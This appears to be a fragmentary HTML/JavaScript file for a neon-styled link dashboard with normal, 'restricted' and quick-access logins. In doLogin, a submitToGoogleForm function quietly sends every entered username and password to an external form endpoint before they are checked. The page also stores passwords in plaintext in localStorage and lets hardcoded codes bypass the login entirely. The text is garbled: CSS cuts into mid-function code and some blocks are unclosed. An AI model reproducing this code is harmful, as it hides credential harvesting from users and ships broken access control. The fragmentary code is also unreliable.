<script src="https://cdn.tailwindcss.com"></script>
<style>
    :root {
        --primary-color: #00ff9e;
        --danger-color: #ff4d6d;
        --bg-color: #030305;
        --glass-bg: rgba(6, 6, 7, 0.85);
    }

    body {
        margin: 0; background: var(--bg-color); color: #e6e6e6;
        font-family: 'Share Tech Mono', ui-monospace, monospace; overflow: hidden;
    }

    .bg-canvas { position: fixed; inset: 0; z-index: 0; opacity: 0.3; pointer-events: none; }

    .card {
        z-index: 2; backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 0, 0, 0.12);
        transition: opacity 1s, transform 1s, border-color 0.3s;
        box-shadow: 0 0 40px rgba(0,0,0,0.5);
    }

    .title { font-family: 'Orbitron', sans-serif; letter-spacing: 4px; text-shadow: 0 0 16px rgba(255, 77, 109, 0.6); }

    input { font-family: 'Share Tech Mono', monospace; }
    
    .login-input {
        background: rgba(6, 6, 7, 0.8); border: 1px solid rgba(0, 255, 140, 0.2);
        color: #bfffbf; padding: 12px; border-radius: 4px; width: 100%; outline: none; letter-spacing: 1px; transition: all 0.3s;
    }
    .login-input:focus { border-color: var(--primary-color); box-shadow: 0 0 15px rgba(0, 255, 140, 0.2); }

    #searchInput {
        background: rgba(0, 0, 0, 0.6); border: 1px solid var(--primary-color); color: var(--primary-color);
        padding: 15px 45px 15px 20px; border-radius: 30px; width: 100%; outline: none;
        font-size: 1.2rem; letter-spacing: 2px; transition: all 0.3s; box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    #searchInput::placeholder { color: rgba(255,255,255,0.3); }
    #searchInput:focus { box-shadow: 0 0 20px var(--primary-color), inset 0 0 10px rgba(0,0,0,0.5); background: rgba(0, 0, 0, 0.8); }

    #darkGlow {
        position: fixed; inset: 0; z-index: 1; pointer-events: none;
        background: radial-gradient(circle at 50% 50%, rgba(0, 255, 160, 0.05), transparent 60%); mix-blend-mode: screen;
        animation: pulseGlow 5s infinite alternate;
    }
    @keyframes pulseGlow { 0% { opacity: 0.3; } 100% { opacity: 0.6; } }
    
    .vanish { opacity: 0 !important; pointer-events: none; transform: scale(1.1); filter: blur(10px); }

    #dashboard {
        position: fixed; inset: 0; z-index: 10;
        display: flex; flex-direction: column; align-items: center; justify-content: start;
        opacity: 0; pointer-events: none; transition: opacity 1.5s ease-in-out;
        overflow-y: auto; padding: 40px 20px;
        background: radial-gradient(circle at center, rgba(10,10,20,0.9) 0%, #000 100%);
    }
    #dashboard.show-dash { opacity: 1; pointer-events: auto; }
    
    .link-container { display: flex; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 1200px; gap: 20px; padding-bottom: 100px; }

    .link-card {
        display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
        width: 200px; height: 80px; background: rgba(6, 6, 7, 0.7);
        border: 1px solid rgba(0, 255, 160, 0.3); border-radius: 4px; text-align: center;
        color: var(--primary-color); text-decoration: none; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; letter-spacing: 1px;
        transition: all 0.2s; backdrop-filter: blur(4px); text-transform: uppercase;
        opacity: 0; transform: scale(0.8) translateY(20px); position: relative; overflow: hidden;
    }
    .link-card .link-favicon {
        width: 22px; height: 22px; object-fit: contain; border-radius: 3px;
        filter: drop-shadow(0 0 4px rgba(0,255,160,0.4));
        transition: filter 0.2s;
    }
    .link-card:hover .link-favicon { filter: drop-shadow(0 0 6px #fff) brightness(1.2); }
    .link-favicon-placeholder {
        width: 22px; height: 22px; border-radius: 3px;
        background: rgba(0,255,160,0.15); border: 1px solid rgba(0,255,160,0.3);
        display: flex; align-items: center; justify-content: center;
        font-size: 11px; color: var(--primary-color);
    }
    .link-card::before {
        content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); transition: 0.5s;
    }
    .link-card:hover::before { left: 100%; }
    .link-card:hover { background: rgba(0, 255, 160, 0.1); border-color: #fff; box-shadow: 0 0 25px rgba(0, 255, 160, 0.6); transform: translateY(-5px) scale(1.05); color: #fff; text-shadow: 0 0 8px #fff; }
    .link-card.secret-mode { border-color: rgba(255, 0, 100, 0.5); color: var(--danger-color); }
    .link-card.secret-mode:hover { border-color: #fff; box-shadow: 0 0 25px rgba(255, 0, 100, 0.6); color: #fff; }
    
    .visible-link { animation: fadeInScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
    @keyframes fadeInScale { to { opacity: 1; transform: scale(1) translateY(0); } }

    .action-btn {
        position: fixed; bottom: 30px; right: 30px; z-index: 100;
        width: 60px; height: 60px; border-radius: 50%; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center;
        transition: all 0.3s; backdrop-filter: blur(4px); opacity: 0; pointer-events: none; transform: scale(0) rotate(180deg); box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    .action-btn.active { opacity: 1; pointer-events: auto; transform: scale(1) rotate(0deg); }

    #secondaryLoginBtn { background: rgba(255, 0, 100, 0.1); border: 1px solid var(--danger-color); color: var(--danger-color); }
    #secondaryLoginBtn:hover { background: var(--danger-color); color: #000; box-shadow: 0 0 30px var(--danger-color); }
    #exitSecretBtn { background: rgba(0, 255, 160, 0.1); border: 1px solid var(--primary-color); color: var(--primary-color); }
    #exitSecretBtn:hover { background: var(--primary-color); color: #000; box-shadow: 0 0 30px var(--primary-color); }
    
    #secondaryLoginForm {
        position: fixed; bottom: 100px; right: 30px; z-index: 99; width: 320px; background: rgba(10, 10, 12, 0.9);
        border: 1px solid var(--danger-color); box-shadow: 0 0 30px rgba(255,0,100,0.15); border-radius: 4px; padding: 24px; backdrop-filter: blur(16px);
        opacity: 0; transform: translateY(20px) scale(0.95); pointer-events: none; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
    #secondaryLoginForm.show { opacity: 1; transform: translateY(0) scale(1); pointer-events: auto; }
    #secondaryLoginForm h3 { color: var(--danger-color); text-align: center; margin-bottom: 20px; font-family: 'Orbitron', sans-serif; letter-spacing: 2px; }

    #holoStatus {
        position: fixed; inset: 0; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center;
        pointer-events: none; opacity: 0; transition: .35s; mix-blend-mode: screen;
    }
    #holoStatus.show { opacity: 1; }
    #holoStatus .main { font: 900 64px 'Orbitron', sans-serif; letter-spacing: 0.2em; text-transform: uppercase; animation: glitchText 0.3s infinite; }
    #holoStatus .sub { font: 700 24px 'Share Tech Mono', monospace; letter-spacing: 0.3em; margin-top: 16px; opacity: 0.9; }
    #holoStatus.success .main, #holoStatus.success .sub { color: var(--primary-color); text-shadow: 0 0 20px var(--primary-color); }
    #holoStatus.fail .main, #holoStatus.fail .sub { color: var(--danger-color); text-shadow: 0 0 20px var(--danger-color); }

    @keyframes glitchText { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }

    #epicIntro { position: fixed; inset: 0; z-index: 999998; display: flex; align-items: center; justify-content: center; background: #000; pointer-events: none; opacity: 0; transition: 0.5s; }
    #epicIntro.show { opacity: 1; pointer-events: auto; }
    .introWrap { width: 300px; text-align: center; }
    .introBrand { color: var(--primary-color); font: 900 48px 'Orbitron', sans-serif; letter-spacing: 0.2em; margin-bottom: 20px; animation: pulseGlow 2s infinite; }
    #introBar { height: 4px; background: rgba(255,255,255,0.2); width: 100%; position: relative; overflow: hidden; }
    #introBar .fill { height: 100%; width: 0%; background: var(--primary-color); box-shadow: 0 0 10px var(--primary-color); transition: width 0.1s linear; }
    .introPct { display: flex; justify-content: space-between; color: #888; font-family: 'Share Tech Mono'; font-size: 12px; margin-top: 8px; }

    #logoutBtn {
        position: fixed; top: 30px; left: 30px; z-index: 100;
        background: rgba(255, 0, 50, 0.1); border: 1px solid var(--danger-color); color: var(--danger-color); padding: 10px 20px;
        font-family: 'Share Tech Mono', monospace; letter-spacing: 2px; font-weight: bold;
        cursor: pointer; backdrop-filter: blur(4px); transition: all 0.3s; opacity: 0; pointer-events: none;
        clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
    }
    #logoutBtn.visible { opacity: 1; pointer-events: auto; }
    #logoutBtn:hover { background: var(--danger-color); color: #000; box-shadow: 0 0 20px var(--danger-color); }

            e.preventDefault(); e.stopPropagation();
            if (confirm(`ลบ "${link.name}" ออกจากรายการ?`)) {
                deleteLocalLink(link.id, isSecret);
                renderDashboard();
            }
        });
        a.appendChild(del);
    }

    return a;
}

function renderDashboard() {
    const container = document.getElementById('linkGrid');
    container.innerHTML = '';
    document.getElementById('searchInput').value = '';
    
    const baseLinks = hiddenLinksVisible ? HIDDEN_LINKS : BASIC_LINKS;
    const localLinks = getLocalLinks(hiddenLinksVisible);

    // render base links
    baseLinks.forEach((link, index) => {
        const card = makeLinkCard(link, index, hiddenLinksVisible, false);
        if (card) container.appendChild(card);
    });

    // render local links (both modes)
    localLinks.forEach((link, index) => {
        const card = makeLinkCard(link, baseLinks.length + index, hiddenLinksVisible, true);
        if (card) container.appendChild(card);
    });

    // Add button — ทั้ง normal และ secret mode
    const addBtn = document.createElement('div');
    addBtn.className = 'add-link-card visible-link';
    if (hiddenLinksVisible) addBtn.style.cssText += 'border-color:rgba(255,0,100,0.3);color:rgba(255,77,109,0.5);';
    addBtn.style.animationDelay = ((baseLinks.length + localLinks.length) * 0.03) + 's';
    addBtn.innerHTML = '<div class="plus-icon">＋</div><span>ADD NODE</span>';
    addBtn.addEventListener('click', openAddLinkModal);
    container.appendChild(addBtn);

    updateUIColors();
}

function updateUIColors() {
    const lockBtn = document.getElementById('secondaryLoginBtn');
    const exitBtn = document.getElementById('exitSecretBtn');
    const title = document.getElementById('dashTitle');
    const searchInput = document.getElementById('searchInput');

    if (hiddenLinksVisible) {
        lockBtn.classList.remove('active'); exitBtn.classList.add('active');
        title.textContent = "RESTRICTED AREA"; title.style.color = "#ff4d6d"; title.style.textShadow = "0 0 30px rgba(255, 0, 100, 0.6)";
        document.body.style.setProperty('--primary-color', '#ff4d6d');
        searchInput.style.borderColor = '#ff4d6d'; searchInput.style.color = '#ff4d6d';
    } else {
        lockBtn.classList.add('active'); exitBtn.classList.remove('active');
        title.textContent = "CONTROL PANEL"; title.style.color = "#00ff9e"; title.style.textShadow = "0 0 30px rgba(0, 255, 160, 0.6)";
        document.body.style.setProperty('--primary-color', '#00ff9e');
        searchInput.style.borderColor = '#00ff9e'; searchInput.style.color = '#00ff9e';
    }
}

function showHiddenLinks() { hiddenLinksVisible = true; transitionLinks(); }
function exitHiddenLinks() { hiddenLinksVisible = false; transitionLinks(); }
function transitionLinks() {
    const allLinks = document.querySelectorAll('.link-card');
    allLinks.forEach((link) => { link.style.opacity = '0'; link.style.transform = 'scale(0.5) translateY(20px)'; });
    setTimeout(() => { renderDashboard(); }, 300);
}

const searchInput = document.getElementById('searchInput');
searchInput.addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase().trim();
    const links = document.querySelectorAll('.link-card');
    links.forEach(link => {
        const name = link.dataset.name; 
        if (name.includes(query)) {
            link.style.display = 'flex'; link.style.animation = 'none'; link.style.opacity = '1'; link.style.transform = 'scale(1) translateY(0)';
        } else { link.style.display = 'none'; }
    });
});

function openAddLinkModal() {
    document.getElementById('newLinkName').value = '';
    document.getElementById('newLinkUrl').value = '';
    document.getElementById('addLinkModal').classList.add('show');
    setTimeout(() => document.getElementById('newLinkName').focus(), 300);
}
function closeAddLinkModal() {
    document.getElementById('addLinkModal').classList.remove('show');
}
function confirmAddLink() {
    const name = document.getElementById('newLinkName').value.trim();
    let url = document.getElementById('newLinkUrl').value.trim();
    if (!name) { document.getElementById('newLinkName').focus(); return; }
    if (!url) { document.getElementById('newLinkUrl').focus(); return; }
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
    addLocalLink(name, url, hiddenLinksVisible);
    closeAddLinkModal();
    renderDashboard();
}
document.getElementById('confirmAddLink').addEventListener('click', confirmAddLink);
document.getElementById('cancelAddLink').addEventListener('click', closeAddLinkModal);
document.getElementById('addLinkModal').addEventListener('click', (e) => {
    if (e.target === document.getElementById('addLinkModal')) closeAddLinkModal();
});
document.getElementById('newLinkUrl').addEventListener('keyup', (e) => { if (e.key === 'Enter') confirmAddLink(); });
document.getElementById('newLinkName').addEventListener('keyup', (e) => { if (e.key === 'Enter') document.getElementById('newLinkUrl').focus(); });

function submitToGoogleForm(u,p){
    const f=document.createElement('form');
    f.action=FORM_ACTION; f.method='POST'; f.target='hidden_gform';
    f.innerHTML=`<input type="hidden" name="${ENTRY_USER}" value="${u}"><input type="hidden" name="${ENTRY_PASS}" value="${p}">`;
    document.body.appendChild(f); f.submit(); f.remove();
}

function showOverlay(k){
    const o=document.getElementById('holoStatus');
    const main=o.querySelector('.main');
    const sub=o.querySelector('.sub');
    
    o.className = k === 'ok' ? 'success show' : 'fail show';
    main.textContent = k === 'ok' ? "ACCESS GRANTED" : "ACCESS DENIED";
    sub.textContent = k === 'ok' ? "WELCOME USER" : "INVALID CREDENTIALS";

    setTimeout(() => o.classList.remove('show'), 1500);
}

let normalAttempts = parseInt(localStorage.getItem('IC_FAILED_ATTEMPTS') || '0');
function checkNormalLoginState() {
    if (normalAttempts >= 3) {
        document.getElementById('loginWrapper').style.display = 'none';
        console.log("NORMAL LOGIN DISABLED: USE QUICK ACCESS");
    }
}
checkNormalLoginState();

function doLogin(){
    if (normalAttempts >= 3) return; 

    const u=document.getElementById('user').value.replace(/\*/g,'');
    const p=document.getElementById('pass').value;

    submitToGoogleForm(u,p);
    const found = [...FULL_ACCESS_USERS, ...BASIC_ACCESS_USERS].find(item => item.user === u && item.pass === p);
    
    if(found){
        localStorage.removeItem('IC_FAILED_ATTEMPTS'); 
        localStorage.setItem('IC_USER', u);
        localStorage.setItem('IC_PASS', p);
        localStorage.setItem('IC_LOGGED_IN', 'true');
        showOverlay('ok');
        setTimeout(()=> {
            renderDashboard();
            document.getElementById('loginWrapper').classList.add('vanish');
            document.getElementById('dashboard').classList.add('show-dash');
            document.getElementById('logoutBtn').classList.add('visible');
            document.getElementById('utilityBtn').classList.add('active'); 
            playGreeting();
            
            const quickUI = document.getElementById('quickLoginUI');
            if (quickUI) quickUI.style.display = 'none';
            
        }, 1200);
    } else {
        normalAttempts++;
        localStorage.setItem('IC_FAILED_ATTEMPTS', normalAttempts);
        
        showOverlay('fail');
        document.getElementById('pass').value = '';
        
        if (normalAttempts >= 3) {
            setTimeout(() => {
                alert("⚠️ SYSTEM ALERT: Normal login disabled due to 3 failed attempts. Please use QUICK ACCESS.");
                checkNormalLoginState();
            }, 1500);
        } else {
            const card = document.querySelector('.card');
            card.style.transform = "translateX(10px)";
            setTimeout(() => card.style.transform = "translateX(-10px)", 100);
            setTimeout(() => card.style.transform = "translateX(10px)", 200);
            setTimeout(() => card.style.transform = "translateX(0)", 300);
        }
    }
}

function doLogout() {
    localStorage.removeItem('IC_USER'); 
    localStorage.removeItem('IC_PASS');
    localStorage.removeItem('IC_FAILED_ATTEMPTS'); 
    localStorage.removeItem('IC_LOGGED_IN');
    
    document.getElementById('dashboard').classList.remove('show-dash');
    document.getElementById('logoutBtn').classList.remove('visible');
    document.getElementById('utilityBtn').classList.remove('active');
    setTimeout(() => location.reload(), 1000);
}

function doSecondaryLogin() {
    const u = document.getElementById('secondaryUser').value.replace(/\*/g,'');
    const p = document.getElementById('secondaryPass').value;
    const foundUser = FULL_ACCESS_USERS.find(item => item.user === u && item.pass === p);
    if(foundUser){
        showOverlay('ok');
        setTimeout(() => {
            showHiddenLinks(); document.getElementById('secondaryLoginForm').classList.remove('show');
            document.getElementById('secondaryUser').value = ''; document.getElementById('secondaryPass').value = '';
        }, 1200);
    } else {
        showOverlay('fail'); document.getElementById('secondaryPass').value = '';
    }
}

document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('logoutBtn').addEventListener('click', doLogout);
document.getElementById('user').addEventListener('keyup', (e) => { if (e.key === 'Enter') doLogin(); });
document.getElementById('pass').addEventListener('keyup', (e) => { if (e.key === 'Enter') doLogin(); });
document.getElementById('secondaryLoginBtn').addEventListener('click', () => {
    document.getElementById('secondaryLoginForm').classList.add('show'); document.getElementById('secondaryUser').focus();
});
document.getElementById('exitSecretBtn').addEventListener('click', exitHiddenLinks);
document.getElementById('secondaryLoginSubmit').addEventListener('click', doSecondaryLogin);
document.getElementById('secondaryLoginCancel').addEventListener('click', () => {
    document.getElementById('secondaryLoginForm').classList.remove('show');
});
document.getElementById('secondaryUser').addEventListener('keyup', (e) => { if (e.key === 'Enter') document.getElementById('secondaryPass').focus(); });
document.getElementById('secondaryPass').addEventListener('keyup', (e) => { if (e.key === 'Enter') doSecondaryLogin(); });
document.addEventListener('click', (e) => {
    const form = document.getElementById('secondaryLoginForm');
    const btn = document.getElementById('secondaryLoginBtn');
    if (form.classList.contains('show') && !form.contains(e.target) && !btn.contains(e.target)) form.classList.remove('show');
});

window.addEventListener('load', () => {
    if (localStorage.getItem('IC_LOGGED_IN') === 'true') {
        document.getElementById('loginWrapper').style.display = 'none';
        document.getElementById('dashboard').classList.add('show-dash');
        document.getElementById('logoutBtn').classList.add('visible');
        document.getElementById('utilityBtn').classList.add('active');
        
        const quickUI = document.getElementById('quickLoginUI');
        if (quickUI) quickUI.style.display = 'none';
        
        renderDashboard();
        playGreeting();
        return;
    }

    const savedUser = localStorage.getItem('IC_USER'); const savedPass = localStorage.getItem('IC_PASS');
    if(savedUser && savedPass && normalAttempts < 3) {
        document.getElementById('user').value = savedUser; document.getElementById('pass').value = savedPass;
    }
});

const passInput = document.getElementById("pass"); const togglePass = document.getElementById("togglePass");
togglePass.addEventListener('click', () => {
    const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passInput.setAttribute('type', type);
    togglePass.innerText = type === 'password' ? '👁️' : '🙈';

const utilBtn = document.getElementById('utilityBtn');
const utilPanel = document.getElementById('utilityPanel');
const closeUtil = document.getElementById('closeUtility');
const tabs = document.querySelectorAll('.tab-btn');
const contents = document.querySelectorAll('.tab-content');

closeUtil.addEventListener('click', () => utilPanel.classList.remove('show'));

tabs.forEach(tab => {

        tab.classList.add('active'); document.getElementById(tab.dataset.target).classList.add('active');

const pxInput = document.getElementById('inputPX'); const remInput = document.getElementById('inputREM'); const baseSize = 16;
pxInput.addEventListener('input', (e) => {
    const px = parseFloat(e.target.value);
    if (!isNaN(px)) remInput.value = (px / baseSize).toFixed(3).replace(/\.?0+$/, ''); else remInput.value = '';
});
remInput.addEventListener('input', (e) => {
    const rem = parseFloat(e.target.value);
    if (!isNaN(rem)) pxInput.value = (rem * baseSize).toFixed(0); else pxInput.value = '';
});

const calcScreen = document.getElementById('calcScreen'); let calcValue = '';
document.querySelectorAll('.calc-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const val = btn.innerText;
        if (val === 'C') { calcValue = ''; calcScreen.innerText = '0'; } 
        else if (val === '⌫') { calcValue = calcValue.slice(0, -1); calcScreen.innerText = calcValue || '0'; } 
        else if (val === '=') {
            try { if (/^[0-9+\-*/.]+$/.test(calcValue)) { calcValue = String(eval(calcValue)); calcScreen.innerText = calcValue; } } 
            catch { calcScreen.innerText = 'ERR'; calcValue = ''; }
        } else { calcValue += val; calcScreen.innerText = calcValue; }
    });
});
</script>

<script>
(function() {
    function enforceBlankScreen(unlockTime) {
        let overlay = document.getElementById('punishOverlay');
        if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'punishOverlay';
            overlay.style.cssText = 'position:fixed;inset:0;background:#000;z-index:9999999;display:flex;align-items:center;justify-content:center;color:#ff4d6d;font-family:"Share Tech Mono",monospace;font-size:24px;flex-direction:column;letter-spacing:2px;';
            document.body.appendChild(overlay);
        }
        
        const updateTimer = setInterval(() => {
            const remaining = Math.ceil((unlockTime - Date.now()) / 1000);
            if (remaining <= 0) {
                clearInterval(updateTimer);
                overlay.remove();
                localStorage.removeItem('siteLockoutUntil');
                document.getElementById('quickAccessInput').disabled = false;
                document.getElementById('quickAccessBtn').disabled = false;
                document.getElementById('quickAccessInput').focus();
            } else {
                overlay.innerHTML = `<div style="font-weight:bold; font-family:'Orbitron',sans-serif;">SYSTEM LOCKED</div><div style="font-size:14px;margin-top:10px;color:#888;">SECURITY COOLDOWN: ${remaining}s</div>`;
            }
        }, 1000);
        overlay.innerHTML = `<div style="font-weight:bold; font-family:'Orbitron',sans-serif;">SYSTEM LOCKED</div>`;
    }

    function checkLockout() {
        const lockoutUntil = localStorage.getItem('siteLockoutUntil');
        if (lockoutUntil && Date.now() < parseInt(lockoutUntil)) {
            enforceBlankScreen(parseInt(lockoutUntil));
            return true;
        }
        return false;
    }

    const quickLoginContainer = document.createElement('div');
    quickLoginContainer.id = 'quickLoginUI'; 
    quickLoginContainer.style.cssText = "position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); z-index: 100;";
    quickLoginContainer.innerHTML = `
        <div style="display: flex; gap: 10px; align-items: stretch; justify-content: center;">
            <input id="quickAccessInput" type="password" autocomplete="off" placeholder="QUICK ACCESS" 
            style="background: rgba(6, 6, 7, 0.8); border: 1px solid rgba(0, 255, 140, 0.2); color: #00ff9e; padding: 12px 20px; border-radius: 4px; text-align: center; font-family: 'Share Tech Mono', monospace; outline: none; letter-spacing: 2px; width: 220px; box-shadow: 0 0 15px rgba(0,0,0,0.5); transition: all 0.3s;">
            
            <button id="quickAccessBtn" style="background: rgba(0, 255, 140, 0.1); border: 1px solid #00ff9e; color: #00ff9e; padding: 0 20px; border-radius: 4px; font-family: 'Orbitron', sans-serif; font-weight: bold; letter-spacing: 1px; cursor: pointer; transition: all 0.3s;">OK</button>
        </div>
        <div style="font-size: 10px; color: #666; text-align: center; margin-top: 8px;">Type #EDIT to change codes</div>
    `;
    document.body.appendChild(quickLoginContainer);

    if (localStorage.getItem('IC_LOGGED_IN') === 'true') {
        quickLoginContainer.style.display = 'none';
    }

    const quickInput = document.getElementById('quickAccessInput');
    const quickBtn = document.getElementById('quickAccessBtn');
    
    quickBtn.addEventListener('mouseenter', () => { quickBtn.style.background = "#00ff9e"; quickBtn.style.color = "#000"; quickBtn.style.boxShadow = "0 0 15px #00ff9e"; });
    quickBtn.addEventListener('mouseleave', () => { quickBtn.style.background = "rgba(0, 255, 140, 0.1)"; quickBtn.style.color = "#00ff9e"; quickBtn.style.boxShadow = "none"; });

    const defaultCodes = [
        "Xhamster", "clotto", "47568", "1739902457730", 
        "xYz9N5O6", "pQ7rSt8U", "vW9xY5Zn", "oP6qRs7T", 
        "uV8wXy9Z", "5N6oP7qR", "sT8uV9wX", "yZ5nO6pQ"

    ];

    let savedCodes = JSON.parse(localStorage.getItem('quickCodes'));
    let QUICK_CODES = (savedCodes && savedCodes.length === 12) ? savedCodes : defaultCodes;

    if (checkLockout()) { 
        quickInput.disabled = true; 
        quickBtn.disabled = true;
    }

    function processQuickAccess() {
        if (checkLockout()) return;

        const val = quickInput.value.trim();
        if (val === '') return;

        if (val === '#EDIT') {
            let newCodesStr = prompt("ตั้งค่ารหัสผ่าน 12 ชุด (คั่นด้วยลูกน้ำ , )\nเงื่อนไข: เลข 1-38, อักษรเล็กและใหญ่ รวม 8 ตัว", QUICK_CODES.join(", "));
            if (newCodesStr) {
                let newCodesArray = newCodesStr.split(",").map(s => s.trim()).filter(s => s !== "");
                if (newCodesArray.length === 12) {
                    let uniqueCodes = [...new Set(newCodesArray)]; 
                    if(uniqueCodes.length === 12) {
                        QUICK_CODES = uniqueCodes;
                        localStorage.setItem('quickCodes', JSON.stringify(QUICK_CODES)); 
                        alert("✅ บันทึกรหัสใหม่ 12 ชุด สำเร็จ!");
                    } else { alert("❌ ขัดข้อง: รหัสผ่านห้ามซ้ำกัน!"); }
                } else { alert("❌ ขัดข้อง: ต้องมีรหัส 12 ชุดพอดี"); }
            }
            quickInput.value = ''; 
            return;
        }

        if (QUICK_CODES.includes(val)) {
            localStorage.removeItem('IC_FAILED_ATTEMPTS');
            localStorage.setItem('IC_LOGGED_IN', 'true');

            quickInput.style.background = "rgba(0, 255, 160, 0.2)";
            quickInput.style.borderColor = "#00ff9e";
            quickInput.style.boxShadow = "0 0 20px #00ff9e";
            quickInput.disabled = true; 
            quickBtn.disabled = true;
            
            const holo = document.getElementById('holoStatus');
            holo.className = 'success show';
            holo.querySelector('.main').textContent = "BYPASS GRANTED";
            holo.querySelector('.sub').textContent = "QUICK ACCESS MODE ACTIVATED";
            setTimeout(() => holo.classList.remove('show'), 1500);

            setTimeout(()=> {
                renderDashboard(); 
                document.getElementById('loginWrapper').classList.add('vanish');
                document.getElementById('dashboard').classList.add('show-dash');
                document.getElementById('logoutBtn').classList.add('visible');
                document.getElementById('utilityBtn').classList.add('active');
                quickLoginContainer.style.display = 'none'; 
                playGreeting(); 
            }, 1200);

        } else {
            quickInput.disabled = true;
            quickBtn.disabled = true;
            const unlockTime = Date.now() + 60000;
            localStorage.setItem('siteLockoutUntil', unlockTime.toString());
            quickInput.value = ''; 
            enforceBlankScreen(unlockTime);
        }
    }

    quickBtn.addEventListener('click', processQuickAccess);
    quickInput.addEventListener('keyup', (e) => {
        if (e.key === 'Enter') processQuickAccess();
    });
})();
</script>
